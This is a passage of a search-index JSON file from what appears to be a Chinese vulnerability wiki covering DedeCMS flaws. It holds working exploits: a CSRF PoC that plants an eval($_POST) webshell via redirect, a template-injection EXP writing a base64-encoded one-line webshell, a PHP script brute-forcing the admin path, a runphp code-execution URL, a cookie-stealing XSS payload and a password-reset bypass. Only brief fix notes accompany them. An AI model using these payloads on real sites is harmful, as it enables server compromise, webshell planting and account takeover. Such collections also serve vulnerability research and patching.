</ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/","title":"DedeCMS_v5.7_\u53cb\u60c5\u94fe\u63a5CSRF_GetShell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#affected-version","title":"Affected Version","text":"<p>DedeCMS-V5.7-UTF8-SP2  \uff08 \u53d1\u5e03\u65e5\u671f  2017-03-15 \uff09</p> <p>\u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1bprjPx1 \u5bc6\u7801: mwdq</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#poc","title":"PoC","text":"<p>\u8be5\u7248\u672c\u5728\u65b0\u5efa&amp;\u4fee\u6539\u6807\u7b7e\u529f\u80fd\uff08\u53ef\u4ee5\u5199PHP\u6587\u4ef6\u5230\u672c\u5730\uff09\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u901a\u8fc7\u7533\u8bf7\u53cb\u60c5\u94fe\u63a5\u7684\u65b9\u5f0f\uff0c\u8bf1\u4f7f\u7ba1\u7406\u5458\u70b9\u51fb\uff0c\u4ece\u800c\u4ece Referer \u4e2d\u62ff\u5230 \u540e\u53f0\u8def\u5f84\uff0c\u8fdb\u800c\u4ee5\u7ba1\u7406\u5458\u7684\u8eab\u4efd\u5199\u4e00\u53e5\u8bdd\u5230\u670d\u52a1\u5668\u4e0a GetShell \u3002</p> <p>\u6d4b\u8bd5\uff1a</p> <ol> <li>\u7533\u8bf7\u53cb\u94fe</li> </ol> <p></p> <ol> <li>\u7f16\u8f91 \u53cb\u94fe \u4fe1\u606f</li> </ol> <p></p> <p>dedecms_csrf.php \u7684\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n$referer = $_SERVER['HTTP_REFERER'];\n$dede_login = str_replace(\"friendlink_main.php\",\"\",$referer);//\u53bb\u6389friendlink_main.php\uff0c\u53d6\u5f97dede\u540e\u53f0\u7684\u8def\u5f84\n$muma = '&lt;'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\\''.'c'.'\\''.']'.')'.';'.'?'.'&gt;';\n$exp = 'tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content='. $muma .'&amp;filename=shell.lib.php';\n$url = $dede_login.$exp;\nheader(\"location: \".$url);\nexit();\n</code></pre> <ol> <li>\u7ba1\u7406\u5458\u767b\u9646\u540e\u53f0\u540e \u5bf9 \u53cb\u94fe\u8fdb\u884c\u5ba1\u6838</li> </ol> <p></p> <ol> <li>\u5ba1\u6838\u7684\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u70b9\u51fb \u5730\u5740 \u770b\u4e00\u4e0b\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u7531\u4e8e\u53cb\u94fe\u4e2d\u4f7f\u7528\u4e86header \u8df3\u8f6c\uff0c\u6240\u4ee5\u7ed3\u679c\u5176\u5b9e\u662f\u8bbf\u95ee\u4e86 <code>http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&amp;actiondo=addnewtag&amp;content=%3C?@eval($_POST[%27c%27]);?%3E&amp;filename=shell.lib.php</code> \u8bf7\u6c42\u3002</li> </ol> <p></p> <ol> <li>\u67e5\u770b\u5199\u5165\u5230\u670d\u52a1\u5668\u7684\u4e00\u53e5\u8bdd <code>shell.lib.php</code></li> </ol> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell/#references","title":"References","text":"<ol> <li>http://0day5.com/archives/4209/</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"DedeCms v5.6 \u5d4c\u5165\u6076\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u5728\u4e0a\u4f20\u8f6f\u4ef6\u7684\u5730\u65b9\uff0c\u5bf9\u672c\u5730\u5730\u5740\u6ca1\u6709\u8fdb\u884c\u6709\u6548\u7684\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u88ab\u6076\u610f\u5229\u7528\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>DedeCms v5.6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u590d\u73b0","text":"<p>\u6ce8\u518c\u4f1a\u5458\uff0c\u4e0a\u4f20\u8f6f\u4ef6\uff1a\u672c\u5730\u5730\u5740\u4e2d\u586b\u5165\u5982\u4e0b\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"POC","text":"<pre><code>a{/dede:link}{dede:toby57 name\\=\"']=0;phpinfo();//\"}x{/dede:toby57}\uff0c\n</code></pre> <p>\u53d1\u8868\u540e\u67e5\u770b\u6216\u4fee\u6539\u5373\u53ef\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#exp","title":"EXP","text":"<pre><code>a{/dede:link}{dede:toby57 name\\=\"']=0;fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz5iYWlkdQ));//\"}x{/dede:toby57}\n</code></pre> <p>\u751f\u6210x.php \u5bc6\u7801\uff1axiao\u76f4\u63a5\u751f\u6210\u4e00\u53e5\u8bdd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%20v5.6%20%E5%B5%8C%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u53c2\u8003","text":"<p>\u77e5\u9053\u521b\u5b87\uff1ahttps://www.seebug.org/vuldb/ssvid-20352</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"DedeCms\u540e\u53f0\u5730\u5740\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u5229\u7528\u9650\u5236","text":"<ul> <li>\u4ec5\u9488\u5bf9windows\u7cfb\u7edf</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","title":"\u8fdb\u5165\u6b63\u9898","text":"<p>\u9996\u5148\u770b\u6838\u5fc3\u6587\u4ef6common.inc.php \u5927\u6982148\u884c\u5de6\u53f3</p> <pre><code>if($_FILES)\n{\n    require_once(DEDEINC.'/uploadsafe.inc.php');\n}\n</code></pre> <p>uploadsafe.inc.php</p> <pre><code>if( preg_match('#^(cfg_|GLOBALS)#', $_key) )\n{\n    exit('Request var not allow for uploadsafe!');\n}\n$$_key = $_FILES[$_key]['tmp_name']; //\u83b7\u53d6temp_name \n${$_key.'_name'} = $_FILES[$_key]['name'];\n${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']);\n${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);\nif(!empty(${$_key.'_name'}) &amp;&amp; (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) )\n{\n    if(!defined('DEDEADMIN'))\n    {\n        exit('Not Admin Upload filetype not allow !');\n    }\n}\nif(empty(${$_key.'_size'}))\n{\n    ${$_key.'_size'} = @filesize($$_key);\n}\n$imtypes = array\n(\n    \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \n    \"image/xpng\", \"image/wbmp\", \"image/bmp\"\n);\nif(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))\n{\n    $image_dd = @getimagesize($$_key); \n    //\u95ee\u9898\u5c31\u5728\u8fd9\u91cc\uff0c\u83b7\u53d6\u6587\u4ef6\u7684size\uff0c\u83b7\u53d6\u4e0d\u5230\u8bf4\u660e\u4e0d\u662f\u56fe\u7247\u6216\u8005\u56fe\u7247\u4e0d\u5b58\u5728\uff0c\u4e0d\u5b58\u5c31exit upload.... ,\u5229\u7528\u8fd9\u4e2a\u903b\u8f91\u731c\u76ee\u5f55\u7684\u524d\u63d0\u662f\u76ee\u5f55\u5185\u6709\u56fe\u7247\u683c\u5f0f\u7684\u6587\u4ef6\u3002\n    if (!is_array($image_dd))\n    {\n        exit('Upload filetype not allow !');\n    }\n}\n......\n</code></pre> <p>\u6ce8\u610f<code>$$_key</code>\u8fd9\u4e00\u53e5\uff0c\u53d8\u91cf<code>$key</code>\u53d6\u81ea\u4e8e<code>$_FILE</code>\uff0c\u7531\u4e8e<code>$_FILE</code>\u53ef\u63a7\u81ea\u7136<code>$key</code>\u4e5f\u53ef\u63a7,\u6b64\u5904\u7406\u8bba\u4e0a\u662f\u53ef\u4ee5\u8986\u76d6\u4efb\u610f\u53d8\u91cf\uff0c\u4f46\u662f\u524d\u9762\u6709\u4e2a\u6b63\u5219\u5224\u65ad\u4e0d\u80fd\u51fa\u73b0<code>cfg_|GLOBALS</code>\u3002(\u4f46\u662f\u5e94\u8be5\u8fd8\u53ef\u4ee5\u8986\u76d6\u5176\u4ed6\u53d8\u91cf\u6b64\u5904\u611f\u89c9\u8fd8\u53ef\u4ee5\u6df1\u6316)</p> <p>\u672c\u4eba\u51fa\u53d1\u70b9\u662f\u627e\u4e2a\u53ef\u4ee5\u5229\u7528<code>&lt;&lt;</code>\u901a\u914d\u7b26\u731c\u89e3\u540e\u53f0\u76ee\u5f55\uff0c\u6240\u4ee5\u53ea\u8981<code>$$_key</code>\u53c2\u6570\u53ef\u63a7\u5c31\u53ef\u4ee5\u8fbe\u5230\u76ee\u7684\u3002</p> <p>\u4fee\u6b63\u4e00\u5904\u7b14\u8bef\u3002  \u4f46\u5728\u8fd9\u4e4b\u524d\u6709\u4e2a<code>if(!defined('DEDEADMIN'))</code>\u7684\u5224\u65ad,\u8fd9\u4e2a\u5f88\u597d\u7ed5\u8fc7\u8bbe\u7f6e<code>tmp_name\u4e3a0\u6216\u80051.jpg\u542b.</code> \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002</p> <pre><code>if(!empty(${$_key.'_name'}) &amp;&amp; (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) )\n    {   \n        if(!defined('DEDEADMIN'))\n        {\n            exit('Not Admin Upload filetype not allow !');\n        }\n    }\n    \u8fd9\u4e2a\u5224\u65ad\u53ea\u9700\u8981\u8bbe\u7f6e${$_key.'_name'} \u7684\u503c\u4e3a0\u6216\u80051.jpg \u542b\u70b9\u201c . \u201d \u65e2\u53ef\u4ee5\u7ed5\u8fc7 \u5982\uff1a_FILES[b4dboy][name]=1.jpg\n</code></pre> <p>\u6700\u540e\u5173\u952e\u7684\u4e00\u70b9\u5c31\u662f\u8981\u8ba9\u6587\u4ef6\u5b58\u5728\u8fd8\u548c\u4e0d\u5b58\u5728\u8fd4\u56de\u4e0d\u540c\u7684\u5185\u5bb9\u5c31\u8981\u63a7\u5236type\u53c2\u6570\u4e86\u3002</p> <p>\u5f53\u76ee\u5f55\u6587\u4ef6\u5b58\u5728\u7684\u65f6\u5019 \u8fd4\u56de\u6b63\u5e38\u9875\u9762\u3002\u5f53\u4e0d\u5b58\u5728\u7684\u65f6\u5019\u8fd4\u56de\uff1aUpload filetype not allow !</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_3","title":"\u4e3e\u4e2a\u4f8b\u5b50","text":"<p>\u6587\u5b57\u4e0d\u597d\u8868\u8fbe\uff0c\u4fbf\u4e8e\u7406\u89e3\u3002</p> <pre><code>&lt;?php\n// ./dedecms/favicon.ico\nif(@getimagesize($_GET['poc'])){\n    echo 1;\n}else {\n    echo 0;\n}\n?&gt;\nget:\nhttp://localhost/test.php?poc=./d&lt;/favicon.ico\n\u8fd4\u56de\uff1a1\n\nhttp://localhost/test.php?poc=./a&lt;/favicon.ico\n\u8fd4\u56de\uff1a0\n\nhttp://localhost/test.php?poc=./de&lt;/favicon.ico\n\u8fd4\u56de\uff1a1\n\nhttp://localhost/test.php?poc=./ded&lt;/favicon.ico\n\u8fd4\u56de\uff1a1\n\n........\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","title":"\u6784\u9020poc","text":"<pre><code>http://localhost/dedecms/tags.php\n\npost:\n\ndopost=save&amp;_FILES[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif\n</code></pre> <p>Common.inc.php \u662f\u88ab\u5168\u5c40\u5305\u542b\u7684\u6587\u4ef6\uff0c\u53ea\u8981\u6587\u4ef6php\u6587\u4ef6\u5305\u542b\u4e86Common.inc.php\u90fd\u53ef\u4ee5\u8fdb\u884c\u6d4b\u8bd5\uff0c\u4ee5tags.php\u6587\u4ef6\u4e3a\u4f8b</p> <p>\u5f53\u76ee\u5f55\u5b58\u5728\u70b9\u65f6\u5019\uff1a \u56fe1</p> <p>  \u5f53\u76ee\u5f55\u4e0d\u5b58\u5728\u70b9\u65f6\u5019\uff1a \u56fe2  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#exp","title":"EXP\uff1a","text":"<pre><code>&lt;?php\n$domain='http://localhost/dedecms/';\n$url=$domain.'/index.php';\nfunction post($url, $data, $cookie = '') {\n    $options = array(\n        CURLOPT_RETURNTRANSFER =&gt; true,\n        CURLOPT_HEADER =&gt; true,\n        CURLOPT_POST =&gt; true,\n        CURLOPT_SSL_VERIFYHOST =&gt; false,\n        CURLOPT_SSL_VERIFYHOST =&gt; false,\n        CURLOPT_COOKIE =&gt; $cookie,\n        CURLOPT_POSTFIELDS =&gt; $data,\n    );\n    $ch = curl_init($url);\n    curl_setopt_array($ch, $options);\n    $result = curl_exec($ch);\n    curl_close($ch);\n    return $result;\n}\n$testlen=25;\n$str=range('a','z');\n$number=range(0,9,1);\n$dic = array_merge($str, $number);\n$n=true;\n$nn=true;\n$path='';\nwhile($n){\n    foreach($dic as $v){\n        foreach($dic as $vv){\n            #echo $v.$vv .'----';\n            $post_data=\"dopost=save&amp;_FILES[b4dboy][tmp_name]=./$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif\";\n            $result=post($url,$post_data);\n            if(strpos($result,'Upload filetype not allow !') === false){\n                $path=$v.$vv;$n=false;break 2;\n            }\n        }\n    }\n}\nwhile($nn){\n    foreach($dic as $vvv){\n        $post_data=\"dopost=save&amp;_FILES[b4dboy][tmp_name]=./$path$vvv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif\";\n        $result=post($url,$post_data);\n        if(strpos($result,'Upload filetype not allow !') === false){\n            $path.=$vvv;\n            echo $path . PHP_EOL;\n            $giturl=$domain.'/'.$path.'/images/admin_top_logo.gif';\n            if(@file_get_contents($giturl)){\n                echo $domain.'/'.$path.'/';\n                $nn=false;break 2;\n            }\n        }\n    }\n}\n?&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_4","title":"\u611f\u8c22","text":"<p>\u611f\u8c22\u7ed9\u6211\u63d0\u4f9b\u8fd9\u4e2a\u601d\u8def\u7684\u670b\u53cb</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/DedeCms%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_5","title":"\u53c2\u8003\u6587\u7ae0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/","title":"Dedecms V5.7\u540e\u53f0\u4efb\u610f\u4ee3\u7801\u6267\u884cCVE-2018-7700","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>\u8be5\u6f0f\u6d1e\u7684\u89e6\u53d1\u6587\u4ef6\u4e3a /dede/tag_test_action.php\u3002\u8d77\u56e0\u662f csrf_check() \u51fd\u6570\u7684\u7ed5\u8fc7\uff0c\u5bfc\u81f4\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#poc","title":"POC","text":"<pre><code>http://localhost/\u540e\u53f0\u5730\u5740/tag_test_action.php?url=a&amp;token=&amp;partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field}\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_2","title":"\u5229\u7528\u6761\u4ef6","text":"<p>\u767b\u5f55\u540e\u53f0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_3","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>\u91cd\u65b0\u5b9e\u73b0 csrf_check() \u51fd\u6570</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/#_4","title":"\u53c2\u8003\u6765\u6e90","text":"<p>\u5148\u77e5\u793e\u533a\uff1ahttps://xz.aliyun.com/t/2224</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/","title":"Dedecms swf\u6587\u4ef6\u53cd\u5c04\u578bxss","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>DedeCMS 5.7 /images/swfupload/swfupload.swf\u6587\u4ef6movieName\u53c2\u6570\u6ca1\u6709\u5408\u9002\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_2","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c","text":"<p>DedeCMS 5.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#_3","title":"\u6587\u4ef6\u4f4d\u7f6e","text":"<p>\u6f0f\u6d1e\u6587\u4ef6\u4e3a\uff1ahttp://127.0.0.1/images/swfupload/swfupload.swf</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://127.0.0.1/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/","title":"Dedecms \u524d\u53f0\u4efb\u610f\u7528\u6237\u5bc6\u7801\u4fee\u6539","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>dedecmsV5.7 SP2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_2","title":"\u6f0f\u6d1e\u6210\u56e0","text":"<p>\u5728\u7528\u6237\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5904\uff0cphp \u5b58\u5728\u5f31\u7c7b\u578b\u6bd4\u8f83\uff0c\u5bfc\u81f4\u5982\u679c\u7528\u6237\u6ca1\u6709\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u5bc6\u4fdd\u95ee\u9898\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801(\u7ba1\u7406\u5458\u8d26\u6237\u9ed8\u8ba4\u4e0d\u8bbe\u7f6e\u5bc6\u4fdd\u95ee\u9898)\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\u4fee\u6539\u7684\u5bc6\u7801\u662f member \u8868\u4e2d\u7684\u5bc6\u7801\uff0c\u5373\u4f7f\u4fee\u6539\u4e86\u7ba1\u7406\u5458\u5bc6\u7801\u4e5f\u662f member \u8868\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801\uff0c\u4ecd\u662f\u65e0\u6cd5\u8fdb\u5165\u7ba1\u7406\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_3","title":"\u590d\u73b0","text":"<p>\u5728\u627e\u56de\u5bc6\u7801\u5904\uff0c\u70b9\u51fb\u901a\u8fc7\u5b89\u5168\u95ee\u9898\u53d6\u56de</p> <p> </p> <p>\u586b\u5199\u4fe1\u606f\u5e76\u6293\u5305\uff0c\u4fee\u6539 id \u548c userid \u4e3a\u60f3\u8981\u91cd\u7f6e\u5bc6\u7801\u7684\u5bf9\u8c61\uff0c\u518d\u52a0\u4e0a\u4ee5\u4e0a\u5206\u6790\u5185\u5bb9\uff0c\u53d1\u5305\u5373\u53ef\u5f97\u5230\u4fee\u6539\u5bc6\u7801 url  \u8fdb\u5165\u8be5url\uff0c\u4fee\u6539\u5bc6\u7801\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/#_4","title":"\u4fee\u590d\u610f\u89c1","text":"<p>\u6539\u4e3a\u5f3a\u7c7b\u578b\u6bd4\u8f83</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/","title":"Dedecms\u4efb\u610f\u7528\u6237\u767b\u5f55SSV-97087","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>dedecmsV5.7 